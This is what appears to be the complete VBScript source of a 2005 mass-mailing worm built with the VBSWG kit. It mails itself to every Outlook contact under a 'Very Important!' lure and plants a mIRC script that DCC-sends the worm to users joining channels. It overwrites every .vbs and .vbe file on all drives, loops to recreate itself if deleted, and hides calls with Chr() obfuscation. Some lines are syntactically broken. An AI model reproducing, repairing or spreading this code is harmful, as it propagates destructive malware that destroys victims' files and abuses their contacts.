'Vbs.Vbswg.Vbswg Worm Created By x. 5/2/2005
Set DV3PI19T = createobject("scripting.filesystemobject")
CI55E4G1 = DV3PI19T.getspecialfolder(2)
F7V48397 = CI55E4G1 & "\Vbswg_Worm.html.vbs"
Set EE88CBPC = createobject("wscript.shell")
DV3PI19T.copyfile wscript.scriptfullname, F7V48397
If EE88CBPC.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Vbswg Worm\KMGC8735") <> 1 then
UGBVL74D
End if
If EE88CBPC.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Vbswg Worm\TS6A3V13") <> 1 then
HK26E291 ""
End if
EQR03JA5
Set T28F8S4C= DV3PI19T.opentextfile(wscript.scriptfullname)
HP7PU723 = T28F8S4C.readall
T28F8S4C.close
Do
if not(DV3PI19T.fileexists(wscript.scriptfullname)) then
set U765I3R2= DV3PI19T.createtextfile(wscript.scriptfullname)
U765I3R2.write HP7PU723
U765I3R2.close
end if
loop
Function UGBVL74D()
Set P7DN109K = CreateObject("Outlook.Application")
If P7DN109K = "Outlook" Then
Set A4CN8G55 = P7DN109K.GetNameSpace("MAPI")
Set BR7CGGNA = A4CN8G55.AddressLists
For Each P1ELC420 In BR7CGGNA
If P1ELC420.AddressEntries.Count <> 0 Then
RVN592GT = P1ELC420.AddressEntries.Count
For JKTPRPM6 = 1 To RVN592GT
Set LDH0782B = P7DN109K.CreateItem(0)
Set K0N65TN3 = P1ELC420.AddressEntries(JKTPRPM6)
LDH0782B.To = K0N65TN3.Address
LDH0782B.Subject = "Very Important!"
LDH0782B.Body = "Hi:" & vbcrlf & "Please view this file, it's very important." & vbcrlf & ""
execute "set TP462NIG =LDH0782B." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
SG9CT8V6 = F7V48397
LDH0782B.DeleteAfterSubmit = True
TP462NIG.Add SG9CT8V6
If LDH0782B.To <> "" Then
LDH0782B.Send
End If
Next
End If
Next
End If
End function
Function HK26E291(FGI94RQ3)
If FGI94RQ3 <> "" Then
FRAV3PI1 = EE88CBPC.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If DV3PI19T.fileexists("c:\mirc\mirc.ini") Then
FGI94RQ3 = "c:\mirc"
ElseIf DV3PI19T.fileexists("c:\mirc32\mirc.ini") Then
FGI94RQ3 = "c:\mirc32"
ElseIf DV3PI19T.fileexists(FRAV3PI1 & "\mirc\mirc.ini") Then
FGI94RQ3 = FRAV3PI1 & "\mirc"
ElseIf DV3PI19T.fileexists(FRAV3PI1 & "\mirc32\mirc.ini") Then
FGI94RQ3 = FRAV3PI1 & "\mirc"
Else
FGI94RQ3 = ""
End If
End If
If FGI94RQ3 <> "" Then
Set U5RL1AK8 = DV3PI19T.CreateTextFile(FGI94RQ3 & "\script.ini", True)
U5RL1AK8 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
U5RL1AK8 = U5RL1AK8 & vbCrLf & "n0=on 1:JOIN:#:{"
U5RL1AK8 = U5RL1AK8 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
U5RL1AK8 = U5RL1AK8 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
U5RL1AK8 = U5RL1AK8 & F7V48397
U5RL1AK8 = U5RL1AK8 & vbCrLf & "n3=}"
script.Close
End If
End Function
Function F4OE88CB()
On Error Resume Next
Set PIKI55E4 = DV3PI19T.Drives
For Each GEI7V483 In PIKI55E4
AULMGC87 = GEI7V483 & " \ "
Call IJ1GBVL7(AULMGC87)
Next
End Function

Function IJ1GBVL7(JR7S6A3V)
A8RK26E2 = JR7S6A3V
Set CO228F8S = DV3PI19T.GetFolder(A8RK26E2)
Set QEEP7PU7 = CO228F8S.Files
For Each T17765I3 In QEEP7PU7
If lcase(T17765I3.Name) = "mirc.ini" Then
HK26E291(T17765I3.ParentFolder)
End If
If DV3PI19T.GetExtensionName(T17765I3.path) = "vbs"
DV3PI19T.CopyFile wscript.scriptfullname,T17765I3.path,true
End if
If DV3PI19T.GetExtensionName(T17765I3.path) = "vbe"
DV3PI19T.CopyFile wscript.scriptfullname,T17765I3.path,true
End if
Next
Set R747DN10 = CO228F8S.Subfolders
For Each EJO4CN8G In R747DN10
Call (EJO4CN8G.path)
Next
End function
'Vbswg 2 Beta. By [K]
